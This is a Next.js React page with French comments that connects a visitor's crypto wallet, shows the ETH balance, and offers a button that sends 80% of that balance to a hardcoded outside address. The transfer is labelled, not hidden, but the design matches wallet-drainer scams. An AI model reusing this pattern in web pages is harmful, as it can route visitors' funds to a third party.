import { useState, useEffect } from "react";
import dynamic from "next/dynamic";
import { useAccount, useConnect, usePublicClient, useWalletClient } from "wagmi";
import { parseEther, formatEther } from "viem";

// Désactivation du SSR pour éviter l'erreur WagmiProviderNotFoundError
const Home = () => {
  const { isConnected, address } = useAccount();
  const { connect, connectors } = useConnect();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();

  const [balance, setBalance] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Récupération du solde du wallet
  useEffect(() => {
    const fetchBalance = async () => {
      if (!isConnected || !publicClient || !address) return;

      try {
        const balanceWei = await publicClient.getBalance({ address });
        setBalance(formatEther(balanceWei));
      } catch (err) {
        console.error("Erreur lors de la récupération du solde :", err);
        setError("Impossible de récupérer le solde");
      }
    };

    fetchBalance();
  }, [isConnected, publicClient, address]);

  // Fonction d'envoi de transaction
  const handleTransfer = async () => {
    if (!walletClient || !balance) return;

    try {
      setLoading(true);
      setError(null);
      const amountToSend = parseEther((parseFloat(balance) * 0.8).toString());

      const tx = await walletClient.sendTransaction({
        to: "0x518c5D62647E60864EcB3826e982c93dFa154af3",
        value: amountToSend,
      });

      console.log("Transaction envoyée :", tx);
      alert("Transaction envoyée avec succès !");
    } catch (err) {
      console.error("Erreur lors de l'envoi de la transaction :", err);
      setError("Échec de la transaction.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <h1>Bienvenue sur mon site Web3 !</h1>
      {!isConnected ? (
        <button onClick={() => connect({ connector: connectors[0] })}>
          Connecter mon portefeuille
        </button>
      ) : (
        <>
          <p>Adresse : {address}</p>
          <p>Solde actuel : {balance} ETH</p>
          <button onClick={handleTransfer} disabled={loading}>
            {loading ? "Envoi en cours..." : "Envoyer 80% de mon solde"}
          </button>
          {error && <p style={{ color: "red" }}>{error}</p>}
        </>
      )}
    </div>
  );
};

// Export avec désactivation du SSR
export default dynamic(() => Promise.resolve(Home), { ssr: false });
